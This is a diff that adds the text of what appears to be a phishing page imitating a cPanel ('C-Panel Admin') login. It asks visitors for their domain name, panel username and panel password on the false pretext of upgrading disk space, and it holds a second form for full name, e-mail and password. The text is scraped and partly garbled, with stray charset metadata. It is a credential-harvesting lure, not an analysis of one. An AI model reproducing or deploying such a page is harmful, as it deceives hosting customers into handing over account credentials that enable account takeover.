@@ -1,0 +1,22 @@
+CPANEL                                                                                                                                                                      C-Panel Admin              
+   Please Log-in with your Domain name and panel username and password to upgrade your Disk space and file uploading portal.  
+                                                               Login
+                                                            Domain Name
+                                                                                                                                                  Panel Username
+                                                                                   
+                                                                                      
+                                                                                          Panel Password
+                                                                                   
+                                                                                               
+                                                                                                                                                                          Manage Your C-panel  
+       text/html; charset=windows-1252 en-us
+Homeundefined
+HOME
+
+Form Title
+Full Name:
+User Name:
+E-mail Address:
+Pass-word:
+Confirm Pass-word:
+© 2017, All Rights Reserved.  text/html; charset=UTF-8   
